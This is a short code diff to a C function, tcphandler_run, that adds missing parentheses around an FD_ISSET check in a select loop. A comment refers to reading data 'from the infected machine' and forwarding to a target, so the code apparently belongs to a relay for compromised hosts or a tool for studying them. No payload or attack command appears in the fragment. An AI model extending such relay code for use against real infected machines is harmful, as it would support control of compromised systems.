@@ -186,7 +186,7 @@ void tcphandler_run(struct tcp_handler_t* tcph)
 				msg(MSG_FATAL, "Could not write to target!");
 				goto out;
 			}
-		} else if FD_ISSET(tcph->inConnFd, &rset) {
+		} else if (FD_ISSET(tcph->inConnFd, &rset)) {
 			// we received data from the infected machine
 			r = read(tcph->inConnFd, payload, MAXLINE - 1);
 			if (!r) {
